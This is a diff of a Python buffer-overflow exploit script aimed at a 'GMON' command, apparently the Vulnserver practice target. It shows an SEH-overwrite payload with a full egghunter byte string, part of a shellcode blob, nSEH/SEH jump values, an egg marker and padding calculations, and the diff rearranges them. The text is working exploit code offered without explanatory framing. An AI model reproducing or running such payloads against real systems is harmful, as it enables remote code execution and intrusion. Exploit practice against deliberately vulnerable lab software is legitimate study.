@@ -14,8 +14,10 @@ command = "GMON /.:/"
 # 4 - Jump back to the location of our "A" (0x41)
 # 5 - Store egghunter here
 
-egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
-"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
+egghunter =  b""
+egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
+egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
+egghunter += b"\xea\xaf\x75\xe7\xff\xe7"
 
 shellcode =  b""
 shellcode += b"\xd9\xe5\xbe\xc4\x4f\x77\xe2\xd9\x74\x24\xf4"
@@ -61,12 +63,13 @@ seh  = "\xb4\x10\x50\x62"
 nseh = "\xeb\xce\x90\x90"
 egg  = "w00tw00t"
 
-payload = "A" * (3503 - len(egg+shellcode))
-payload +=  egg
+# 8
+payload =  egg
+# 32
 payload += shellcode
-#payload += "A" * (3503 - len(payload))
+payload += "A" * (3499 - len(payload))
 payload += egghunter
-#payload += "B" * (3547 - len(payload))
+payload += "A" * (3547 - len(payload))
 payload += nseh
 payload += seh
 payload += "D" * (5000-len(payload))
